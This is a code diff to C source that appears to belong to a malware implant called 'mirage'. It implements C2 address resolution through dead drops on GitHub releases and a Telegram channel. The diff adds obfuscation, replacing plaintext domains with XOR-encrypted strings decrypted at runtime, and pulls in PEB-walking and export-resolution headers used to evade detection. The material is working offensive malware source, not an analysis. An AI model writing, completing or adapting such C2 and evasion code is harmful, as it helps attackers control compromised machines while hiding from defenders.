@@ -4,14 +4,10 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
-
-/* ── xor-encrypted strings (compile-time in Zig; here as static data) ── */
-/* These would normally come from a xor_encrypted.inc or similar.
-   Placeholder definitions for the pattern — replace with real XOR blobs. */
-static const char enc_github_api[]     = "api.github.com";
-static const char enc_github_releases[] = "/repos/{s}/{s}/releases/latest";
-static const char enc_telegram_host[]   = "t.me";
-static const char enc_telegram_path[]   = "/s/{s}";
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "enc_strings.h"
 
 /* ── helpers ────────────────────────────────────────────────────── */
 
@@ -93,6 +89,10 @@ int proxy_parse_c2(const char *body, size_t body_len, proxy_result_t *out) {
 /* ── resolve by channel ────────────────────────────────────────── */
 
 static int resolve_github(proxy_result_t *out) {
+    /* Decrypt domain: api.github.com */
+    char github_host[32];
+    enc_decrypt(enc_github_api, ENC_GITHUB_API_LEN, github_host);
+
     /* Build path: /repos/{user}/{repo}/releases/latest */
     const char *user = "mirage";
     const char *repo = "c2";
@@ -102,32 +102,32 @@ static int resolve_github(proxy_result_t *out) {
 
     /* Connect to api.github.com:443 (plaintext here; TLS layer wraps externally) */
     ws2_socket_t sk;
-    ws2_result_t r = ws2_connect(&sk, enc_github_api, 443);
+    ws2_result_t r = ws2_connect(&sk, github_host, 443);
     if (r != WS2_OK) return 0;
 
     /* build minimal HTTP GET */
     char request[512];
     int rlen = snprintf(request, sizeof(request),
         "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
-        path, enc_github_api);
-    if (rlen <= 0 || (size_t)rlen >= sizeof(request)) { ws2_close((HANDLE)(intptr_t)&sk); return 0; }
+        path, github_host);
+    if (rlen <= 0 || (size_t)rlen >= sizeof(request)) { ws2_close(sk.handle); return 0; }
 
     size_t sent = 0;
-    r = ws2_send((HANDLE)(intptr_t)&sk, (const uint8_t *)request, (size_t)rlen, &sent);
-    if (r != WS2_OK) { ws2_close((HANDLE)(intptr_t)&sk); return 0; }
+    r = ws2_send(sk.handle, (const uint8_t *)request, (size_t)rlen, &sent);
+    if (r != WS2_OK) { ws2_close(sk.handle); return 0; }
 
     /* read response */
     char resp_buf[8192];
     size_t total = 0;
     size_t chunk;
     while (total < sizeof(resp_buf) - 1) {
-        r = ws2_recv((HANDLE)(intptr_t)&sk, (uint8_t *)resp_buf + total,
+        r = ws2_recv(sk.handle, (uint8_t *)resp_buf + total,
                       sizeof(resp_buf) - 1 - total, &chunk);
         if (r != WS2_OK || chunk == 0) break;
         total += chunk;
     }
     resp_buf[total] = '\0';
-    ws2_close((HANDLE)(intptr_t)&sk);
+    ws2_close(sk.handle);
 
     if (total == 0) return 0;
 
@@ -145,36 +145,40 @@ static int resolve_github(proxy_result_t *out) {
 }
 
 static int resolve_telegram(proxy_result_t *out) {
+    /* Decrypt domain: t.me */
+    char tg_host[16];
+    enc_decrypt(enc_telegram_host, ENC_TELEGRAM_HOST_LEN, tg_host);
+
     const char *channel_name = "mirage_c2";
     char path[128];
     int n = snprintf(path, sizeof(path), "/s/%s", channel_name);
     if (n <= 0 || (size_t)n >= sizeof(path)) return 0;
 
     ws2_socket_t sk;
-    ws2_result_t r = ws2_connect(&sk, enc_telegram_host, 443);
+    ws2_result_t r = ws2_connect(&sk, tg_host, 443);
     if (r != WS2_OK) return 0;
 
     char request[512];
     int rlen = snprintf(request, sizeof(request),
         "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
-        path, enc_telegram_host);
-    if (rlen <= 0 || (size_t)rlen >= sizeof(request)) { ws2_close((HANDLE)(intptr_t)&sk); return 0; }
+        path, tg_host);
+    if (rlen <= 0 || (size_t)rlen >= sizeof(request)) { ws2_close(sk.handle); return 0; }
 
     size_t sent = 0;
-    r = ws2_send((HANDLE)(intptr_t)&sk, (const uint8_t *)request, (size_t)rlen, &sent);
-    if (r != WS2_OK) { ws2_close((HANDLE)(intptr_t)&sk); return 0; }
+    r = ws2_send(sk.handle, (const uint8_t *)request, (size_t)rlen, &sent);
+    if (r != WS2_OK) { ws2_close(sk.handle); return 0; }
 
     char resp_buf[8192];
     size_t total = 0;
     size_t chunk;
     while (total < sizeof(resp_buf) - 1) {
-        r = ws2_recv((HANDLE)(intptr_t)&sk, (uint8_t *)resp_buf + total,
+        r = ws2_recv(sk.handle, (uint8_t *)resp_buf + total,
                       sizeof(resp_buf) - 1 - total, &chunk);
         if (r != WS2_OK || chunk == 0) break;
         total += chunk;
     }
     resp_buf[total] = '\0';
-    ws2_close((HANDLE)(intptr_t)&sk);
+    ws2_close(sk.handle);
 
     if (total == 0) return 0;
 
